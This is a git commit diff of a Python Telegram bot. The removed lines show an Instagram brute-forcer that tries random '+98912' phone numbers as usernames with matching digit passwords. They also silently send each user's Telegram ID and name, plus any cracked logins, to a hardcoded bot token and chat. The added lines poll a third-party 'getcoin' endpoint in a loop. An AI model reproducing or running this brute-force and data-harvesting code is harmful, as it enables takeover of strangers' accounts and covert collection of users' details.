d37ffb3ce576b3b6db58cf983171a58e561e8c62
Mhmd-Iraqi <103595056+Mhmd-Iraqi@users.noreply.github.com>
2022-05-09 19:12:22 +0300

    Update main.py

--- main.py
+++ main.py
@@ -13,69 +13,50 @@ logger.setLevel(logging.DEBUG)
 
 
 @bot.message_handler(commands=['start'])
-def boten(message):
-	id = message.from_user.id
-	name = message.from_user.first_name
-	username = message.from_user.username
-	requests.post(f"https://api.telegram.org/bot5070230115:AAFvXjBaRwtBLkahVlw9cybLJ56ZTV2H2Ag/sendMessage?chat_id=5009434402&text=@{username} استخدم البوت\nالايدي : {id}\nالاسم : {name}")
-	mas = types.InlineKeyboardMarkup(row_width=1)
-	A = types.InlineKeyboardButton(text="Start Hack▶️",callback_data="start"+str(id))
-	B = types.InlineKeyboardButton("المطور",url="https://t.me/WXGDX")
-	mas.add(A,B)
+def G(message):
+ 
+	mas = types.InlineKeyboardMarkup(row_width=2)
+	A=types.InlineKeyboardButton("CH1",url="https://t.me/WXGDS")
+	B=types.InlineKeyboardButton("CH2",url="https://t.me/WXGDF")
+	C=types.InlineKeyboardButton("Dev🤖",url="https://t.me/WXGDX")
+	mas.add(A,B,C)
 	bot.send_message(message.chat.id,msg,reply_markup=mas,parse_mode="markdown")
+	bot.reply_to(message,text="ID:Sleep", parse_mode = "markdown",disable_web_page_preview="true")
+@bot.message_handler(func=lambda m:True)
 
-@bot.callback_query_handler(func=lambda call : True)
-def callback(call):
- id = call.message.chat.id
- if call.data == "start"+str(id):
-  L=instaloader.Instaloader()
-  h = 0
-  b = 0
-
-  us = "0987654321"
-  while True:
-	
-  	use = ("".join(random.choice(us)for i in range(7)))
-  	user = "+98912" + use
-  	pas = use
-	
-	
+def callback(message):
+ id = message.chat.id
+ while True:
+  try:
+  	if str(id) in str(s):
+  		s.remove(id)
+  		mas = types.InlineKeyboardMarkup(row_width=2)
+  		A=types.InlineKeyboardButton("CH1",url="https://t.me/WXGDS")
+  		B=types.InlineKeyboardButton("CH2",url="https://t.me/WXGDF")
+  		C=types.InlineKeyboardButton("Dev🤖",url="https://t.me/WXGDX")
+  		mas.add(A,B,C)
+  		bot.send_message(message.chat.id,msg,reply_markup=mas,parse_mode="markdown")
+  		bot.reply_to(message,text="ID:Sleep", parse_mode = "markdown",disable_web_page_preview="true")
+  		break
+  		
   	
-	
-	
-  	try:		
-				
-  		L.login(user, pas)
-  		os.system("clear")
-  		h+=1
-  		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"""
-Hunt : {h}
-Bad : {b}
-Username : {user}
-Password : {pas}""")
-  		requests.post(f"https://api.telegram.org/bot5070230115:AAFvXjBaRwtBLkahVlw9cybLJ56ZTV2H2Ag/sendMessage?chat_id={id}&text="f"""
-		لك تعال صدتلك حساب🤖
-		=======MHMD=======
-		
-		Username : {user}
-		
-		Password : {pas}
-		
-		=======MHMD=======
-	
-		BY:@WXGDX
-		
-		CH:@XXWWE""",parse_mode="markdown")
-  	except:
-
-  		os.system("clear")
-  		b+=1
-  		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"""
-Hunt : {h}
-Bad : {b}
-Username : {user}
-Password : {pas}""",parse_mode="markdown")
-		
+  	ml = message.text
+  	msa = ml.split(":")[0]
+  	sle = ml.split(":")[1]
+  	
+  	url = requests.post(f"https://getcoin-murad-hazem.ols1an.repl.co/?uid={msa}&submit=submit").text
+  
+  	if ('{"coins":') in url:
+  		id = message.chat.id  	
+  		coinx = str(url.split('coins":"')[1])
+  		coin = str(coinx.split('"')[0])
+  		bot.reply_to(message,text=f"""
+  		Coins : {coin}
+""",parse_mode="markdown")
+  		time.sleep(int(sle))
+  except:
+  	bot.reply_to(message,text="Id Blocked")
+  	s.append(id)
 
 @server.route(f"/{BOT_TOKEN}", methods=["POST"])
 def redirect_message():
